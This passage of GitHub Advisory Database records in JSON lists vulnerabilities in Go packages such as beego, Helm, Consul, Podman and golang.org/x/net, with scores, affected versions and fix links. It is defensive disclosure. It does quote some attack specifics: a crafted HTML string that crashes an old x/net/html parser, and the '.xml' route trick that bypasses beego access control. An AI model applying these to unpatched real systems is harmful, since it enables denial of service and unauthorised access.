https://github.com/gogs/gogs/issues/6919.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-ff28-f46g-r9g8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1464"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/bc77440b301ac8780698be91dff1ac33b7cee850"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/34a12146-3a5d-4efc-a0f8-7a3ae04b198d"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T20:48:14Z", "nvd_published_at": "2022-05-05T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5hjh-c26m-xw8w", "modified": "2022-05-04T20:14:02Z", "published": "2022-05-03T00:00:44Z", "aliases": ["CVE-2022-25850"], "summary": "ProxyScotch is vulnerable to a server-side Request Forgery (SSRF)", "details": "ProxyScotch is a simple proxy server created for hoppscotch.io. The package github.com/hoppscotch/proxyscotch before 1.0.0 are vulnerable to Server-side Request Forgery (SSRF) when interceptor mode is set to proxy. It occurs when an HTTP request is made by a backend server to an untrusted URL submitted by a user. It leads to a leakage of sensitive information from the server.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hoppscotch/proxyscotch"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25850"}, {"type": "WEB", "url": "https://github.com/hoppscotch/proxyscotch/commit/de67380f62f907f201d75854b76024ba4885fab7"}, {"type": "PACKAGE", "url": "https://github.com/hoppscotch/proxyscotch"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHOPPSCOTCHPROXYSCOTCH-2435228"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-04T20:14:02Z", "nvd_published_at": "2022-05-01T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9h9f-9q8g-6764", "modified": "2023-07-17T23:01:54Z", "published": "2022-05-24T16:55:43Z", "aliases": ["CVE-2019-16146"], "summary": "Gophish XSS Vulnerability", "details": "Gophish through 0.8.0 allows XSS via a username.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gophish/gophish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}], "database_specific": {"last_known_affected_version_range": "< 0.8.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-16146"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/pull/1547"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/commit/24fe998a3aa04e205900476a9601d481e94d8eea"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-17T23:01:54Z", "nvd_published_at": "2019-09-09T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jgwg-35hf-xqrr", "modified": "2023-09-28T20:29:31Z", "published": "2022-05-13T01:12:23Z", "withdrawn": "2023-09-28T20:29:31Z", "aliases": ["CVE-2019-3876"], "summary": "Withdrawn Advisory: OpenShift OAuth Server XSS Vulnerability", "details": "## Withdrawn Advisory\n\nThis advisory has been withdrawn because the vulnerability does not affect a package in one of the GitHub Advisory Database's [supported ecosystems](https://github.com/github/advisory-database/blob/main/README.md#supported-ecosystems). This link is maintained to preserve external references.\n\n## Original Description\n\nA flaw was found in the `/oauth/token/request` custom endpoint of the OpenShift OAuth server allowing for XSS generation of CLI tokens due to missing X-Frame-Options and CSRF protections. If not otherwise prevented, a separate XSS vulnerability via JavaScript could further allow for the extraction of these tokens.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/oauth-apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0"}, {"fixed": "3.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-3876"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:1851"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2019-3876"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1691107"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-3876"}, {"type": "WEB", "url": "https://web.archive.org/web/20210126211309/http://www.securityfocus.com/bid/107664"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-19T19:30:34Z", "nvd_published_at": "2019-04-01T15:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qx32-f6g6-fcfr", "modified": "2023-08-29T17:53:16Z", "published": "2022-05-22T00:00:32Z", "aliases": ["CVE-2022-31259"], "summary": "Access control bypass in beego", "details": "The route lookup process in beego prior to 1.12.9 and 2.x prior to 2.0.3 allows attackers to bypass access control. When a /`p1`/`p2`/`:name` route is configured, attackers can access it by appending .xml in various places (e.g., p1.xml instead of p1).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31259"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/4946"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/4954"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/4958"}, {"type": "WEB", "url": "https://github.com/beego/beego/commit/228576173a236c81a2122923fcf8099ad294e009"}, {"type": "WEB", "url": "https://github.com/beego/beego/commit/64cf44d725c8cc35d782327d333df9cbeb1bf2dd"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-qx32-f6g6-fcfr"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}, {"type": "WEB", "url": "https://github.com/beego/beego/tree/v2.0.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0463"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-05-25T20:35:48Z", "nvd_published_at": "2022-05-21T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vc7h-cmp3-4hw5", "modified": "2023-10-19T18:09:28Z", "published": "2022-05-24T22:01:14Z", "aliases": ["CVE-2019-18817"], "summary": "Istio vulnerable to denial of service", "details": "Istio 1.3.x before 1.3.5 is vulnerable to denial of service because `continue_on_listener_filters_timeout` is set to True, a related issue to CVE-2019-18836.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-18817"}, {"type": "WEB", "url": "https://github.com/istio/istio/issues/18229"}, {"type": "WEB", "url": "https://github.com/istio/istio/issues/18229#issuecomment-553190142"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/7570a1f5b56c108aed6ecfa5d2a6048f444bfb37"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio"}, {"type": "WEB", "url": "https://istio.io/news/2019/announcing-1.3.5/"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-19T18:09:28Z", "nvd_published_at": "2019-11-12T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-85c5-ccm8-vr96", "modified": "2023-08-25T21:43:47Z", "published": "2022-05-24T16:51:05Z", "aliases": ["CVE-2019-14243"], "summary": "mastercactapus proxyprotocol vulnerable to denial of service", "details": "headerv2.go in mastercactapus proxyprotocol before 0.0.2, as used in the mastercactapus caddy-proxyprotocol plugin through 0.0.2 for Caddy, allows remote attackers to cause a denial of service (webserver panic and daemon crash) via a crafted HAProxy PROXY v2 request with truncated source/destination address data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mastercactapus/proxyprotocol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14243"}, {"type": "WEB", "url": "https://github.com/mastercactapus/caddy-proxyprotocol/issues/8"}, {"type": "WEB", "url": "https://github.com/mastercactapus/proxyprotocol/issues/1"}, {"type": "WEB", "url": "https://github.com/mastercactapus/proxyprotocol/commit/5c4a101121fc3e868026189c7a73f7f19eef90ac"}, {"type": "WEB", "url": "https://caddy.community/t/dos-in-http-proxyprotocol-plugin/6014"}, {"type": "PACKAGE", "url": "https://github.com/mastercactapus/proxyprotocol"}, {"type": "WEB", "url": "https://github.com/mastercactapus/proxyprotocol/compare/ef496d7...5c4a101"}, {"type": "WEB", "url": "https://github.com/mastercactapus/proxyprotocol/releases/tag/v0.0.2"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-14T20:53:45Z", "nvd_published_at": "2019-07-23T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hj57-j5cw-2mwp", "modified": "2022-06-08T21:57:40Z", "published": "2022-05-25T19:37:37Z", "aliases": ["CVE-2022-1706"], "summary": "Ignition config accessible to unprivileged software on VMware", "details": "### Impact\nUnprivileged software in VMware VMs, including software running in unprivileged containers, can retrieve an Ignition config stored in a hypervisor guestinfo variable or OVF environment.  If the Ignition config contains secrets, this can result in the compromise of sensitive information.\n\n### Patches\nIgnition 2.14.0 and later [adds](https://github.com/coreos/ignition/pull/1350) a new systemd service, `ignition-delete-config.service`, that deletes the Ignition config from supported hypervisors (currently VMware and VirtualBox) during the first boot.  This ensures that unprivileged software cannot retrieve the Ignition config from the hypervisor.\n\nIf you have external tooling that requires the Ignition config to remain accessible in VM metadata after provisioning, and your Ignition config does not include sensitive information, you can prevent Ignition 2.14.0 and later from deleting the config by masking `ignition-delete-config.service`.  For example:\n\n```json\n{\n  \"ignition\": {\n    \"version\": \"3.0.0\"\n  },\n  \"systemd\": {\n    \"units\": [\n      {\n        \"name\": \"ignition-delete-config.service\",\n        \"mask\": true\n      }\n    ]\n  }\n}\n```\n\n### Workarounds\n[Avoid storing secrets](https://coreos.github.io/ignition/operator-notes/#secrets) in Ignition configs. In addition to VMware, many cloud platforms allow unprivileged software in a VM to retrieve the Ignition config from a networked cloud metadata service. While platform-specific mitigation is possible, such as firewall rules that prevent access to the metadata service, it's best to store secrets in a dedicated platform such as [Hashicorp Vault](https://www.vaultproject.io/).\n\n### Advice to Linux distributions\nLinux distributions that ship Ignition should ensure the new `ignition-delete-config.service` is installed and enabled by default.\n\nIn addition, we recommend shipping a service similar to `ignition-delete-config.service` that runs when existing machines are upgraded, similar to the one in https://github.com/coreos/fedora-coreos-config/pull/1738. Consider giving your users advance notice of this change, and providing instructions for masking `ignition-delete-config.service` on existing nodes if users have tooling that requires the Ignition config to remain accessible in VM metadata.\n\n### References\nFor more information, see #1300 and #1350.\n\n### For more information\nIf you have any questions or comments about this advisory, [open an issue in Ignition](https://github.com/coreos/ignition/issues/new/choose) or email the CoreOS [development mailing list](https://lists.fedoraproject.org/archives/list/coreos@lists.fedoraproject.org/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/coreos/ignition/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.14.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/coreos/ignition"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.14.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.35.0"}}], "references": [{"type": "WEB", "url": "https://github.com/coreos/ignition/security/advisories/GHSA-hj57-j5cw-2mwp"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/issues/1300"}, {"type": "WEB", "url": "https://github.com/coreos/ignition/pull/1350"}, {"type": "PACKAGE", "url": "github.com/coreos/ignition"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-863", "CWE-921"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:37:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2jq6-ffph-p4h8", "modified": "2023-07-21T21:50:42Z", "published": "2022-05-13T01:35:04Z", "aliases": ["CVE-2018-1002100"], "summary": "Kubernetes arbitrary file overwrite", "details": "In Kubernetes versions 1.5.x, 1.6.x, 1.7.x, 1.8.x, and prior to version 1.9.6, the kubectl cp command insecurely handles tar data returned from the container, and can be caused to overwrite arbitrary local files.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5"}, {"fixed": "1.9.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002100"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/61297"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1564305"}, {"type": "WEB", "url": "https://hansmi.ch/articles/2018-04-openshift-s2i-security"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-21T21:50:42Z", "nvd_published_at": "2018-06-02T01:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fhm8-cxcv-pwvc", "modified": "2023-09-28T20:29:24Z", "published": "2022-05-13T01:22:55Z", "aliases": ["CVE-2019-8336"], "summary": "HashiCorp Consul Access Restriction Bypass", "details": "HashiCorp Consul (and Consul Enterprise) 1.4.x before 1.4.3 allows a client to bypass intended access restrictions and obtain the privileges of one other arbitrary token within secondary datacenters, because a token with literally \"<hidden>\" as its secret is used in unusual circumstances.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-8336"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/5423"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/90040f8bffb311e6cd8599273e95b607175e311f"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/003370ded024096cd89fb2aa2bc15293c23b9707/agent/consul/leader.go#L405"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-19T18:40:12Z", "nvd_published_at": "2019-03-05T23:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h86h-8ppg-mxmh", "modified": "2023-10-02T16:31:17Z", "published": "2022-05-24T19:03:29Z", "aliases": ["CVE-2021-31525"], "summary": "golang.org/x/net/http/httpguts vulnerable to Uncontrolled Recursion", "details": "golang.org/x/net/http/httpguts in Go before 1.15.12 and 1.16.x before 1.16.4 allows remote attackers to cause a denial of service (panic) via a large header to ReadRequest or ReadResponse. Server, Transport, and Client can each be affected in some configurations.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20210428140749-89ef3d95e781"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31525"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/45710"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go.dev/cl/313069"}, {"type": "WEB", "url": "https://go.dev/issue/45710"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/89ef3d95e781148a0951956029c92a211477f7f9"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/cu9SP4eSXMc"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ISRZZ6NY5R2TBYE72KZFOCO25TEUQTBF/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0236"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-02"}], "database_specific": {"cwe_ids": ["CWE-674"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:35:49Z", "nvd_published_at": "2021-05-27T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gxhv-3hwf-wjp9", "modified": "2023-02-08T00:27:34Z", "published": "2022-05-13T01:34:31Z", "aliases": ["CVE-2018-14632"], "summary": "JSON-Patch Out-of-bounds Write vulnerability", "details": "An out of bound write can occur when patching an Openshift object using the `oc patch` functionality in OpenShift Container Platform before 3.7. An attacker can use this flaw to cause a denial of service attack on the Openshift master api service which provides cluster management.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/evanphx/json-patch"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/evanphx/json-patch"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.1-0.20180525145409-4c9aadca8f89"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-14632"}, {"type": "WEB", "url": "https://github.com/evanphx/json-patch/pull/57"}, {"type": "WEB", "url": "https://github.com/evanphx/json-patch/commit/4c9aadca8f89e349c999f04e28199e96e81aba03"}, {"type": "WEB", "url": "https://github.com/evanphx/json-patch/commit/4c9aadca8f89e349c999f04e28199e96e81aba03#diff-65c563bba473be9d94ce4d033f74810e"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2018:2652"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2654"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2709"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2906"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2908"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-14632"}, {"type": "PACKAGE", "url": "https://github.com/evanphx/json-patch"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0076"}], "database_specific": {"cwe_ids": ["CWE-787"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:27:34Z", "nvd_published_at": "2018-09-06T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xrxm-mvqm-r553", "modified": "2023-09-28T20:38:53Z", "published": "2022-05-14T01:33:54Z", "aliases": ["CVE-2019-1000008"], "summary": "Helm Path Traversal", "details": "All versions of Helm between Helm >=2.0.0 and < 2.12.2 contains a CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in The commands `helm fetch --untar` and `helm lint some.tgz` that can result when chart archive files are unpacked a file may be unpacked outside of the target directory. This attack appears to be exploitable via a victim must run a helm command on a specially crafted chart archive. This vulnerability appears to have been fixed in 2.12.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.12.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1000008"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://helm.sh/blog/helm-security-notice-2019/index.html"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-19T21:14:08Z", "nvd_published_at": "2019-02-04T21:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8mpq-fmr3-6jxv", "modified": "2023-09-29T15:43:23Z", "published": "2022-05-24T16:44:07Z", "aliases": ["CVE-2015-1340"], "summary": "LXD vulnerable to Race Condition", "details": "LXD before version 0.19-0ubuntu5 `doUidshiftIntoContainer()` has an unsafe `Chmod()` call that races against the stat in the `Filepath.Walk()` function. A symbolic link created in that window could cause any file on the system to have any mode of the attacker's choice.\n\n### Specific Go Packages Affected\ngithub.com/lxc/lxd/shared", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lxc/lxd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20151004155856-19c6961cc101"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1340"}, {"type": "WEB", "url": "https://github.com/lxc/lxd/pull/1189"}, {"type": "WEB", "url": "https://github.com/lxc/lxd/commit/19c6961cc1012c8a529f20807328a9357f5034f4"}, {"type": "WEB", "url": "https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1502270"}, {"type": "PACKAGE", "url": "https://github.com/lxc/lxd"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0071"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:39:10Z", "nvd_published_at": "2019-04-22T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fcf9-6fv2-fc5v", "modified": "2023-02-08T00:36:45Z", "published": "2022-05-13T01:19:23Z", "aliases": ["CVE-2018-17143"], "summary": "golang.org/x/net/html has Improper Restriction of Operations within the Bounds of a Memory Buffer", "details": "The html package (aka x/net/html) through 2018-09-17 in Go mishandles <template><tBody><isindex/action=0>, leading to a \"panic: runtime error\" in inBodyIM in parse.go during an html.Parse call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180921000356-2f5d2388922f"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17143"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27704"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go-review.googlesource.com/c/net/+/136575"}, {"type": "WEB", "url": "https://go.dev/issue/27704"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/2f5d2388922f370f4355f327fcf4cfe9f5583908"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0193"}], "database_specific": {"cwe_ids": ["CWE-119"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:36:45Z", "nvd_published_at": "2018-09-17T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vmhj-p9hw-vgrf", "modified": "2023-02-08T18:07:43Z", "published": "2022-05-24T17:08:34Z", "aliases": ["CVE-2020-1726"], "summary": "Podman has Files or Directories Accessible to External Parties", "details": "A flaw was discovered in Podman where it incorrectly allows containers when created to overwrite existing files in volumes, even if they are mounted as read-only. When a user runs a malicious container or a container based on a malicious image with an attached volume that is used for the first time, it is possible to trigger the flaw and overwrite files in the volume. This issue was introduced in version 1.6.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "2.0.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1726"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/c140ecdc9b416ab4efd4d21d14acd63b6adbdd42"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0680"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:1650"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2020-1726"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1801152"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1726"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00097.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00103.html"}], "database_specific": {"cwe_ids": ["CWE-552"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T18:07:43Z", "nvd_published_at": "2020-02-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p5pc-m4q7-7qm9", "modified": "2023-09-26T19:48:05Z", "published": "2022-05-24T22:01:14Z", "aliases": ["CVE-2019-18658"], "summary": "Helm Unsafe Link Following", "details": "In Helm 2.x before 2.15.2, commands that deal with loading a chart as a directory or packaging a chart provide an opportunity for a maliciously designed chart to include sensitive content such as `/etc/passwd`, or to execute a denial of service (DoS) via a special file such as /dev/urandom, via symlinks. No version of Tiller is known to be impacted. This is a client-only issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.15.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-18658"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://helm.sh/blog/2019-10-30-helm-symlink-security-notice/"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-17T23:57:06Z", "nvd_published_at": "2019-11-12T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hgr8-6h9x-f7q9", "modified": "2023-09-29T16:45:58Z", "published": "2022-05-24T16:53:17Z", "aliases": ["CVE-2019-9512"], "summary": "golang.org/x/net/http vulnerable to ping floods", "details": "Some HTTP/2 implementations are vulnerable to ping floods, potentially leading to a denial of service. The attacker sends continual pings to an HTTP/2 peer, causing the peer to build an internal queue of responses. Depending on how efficiently this data is queued, this can consume excess CPU, memory, or both.\n\n### Specific Go Packages Affected\ngolang.org/x/net/http2", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": 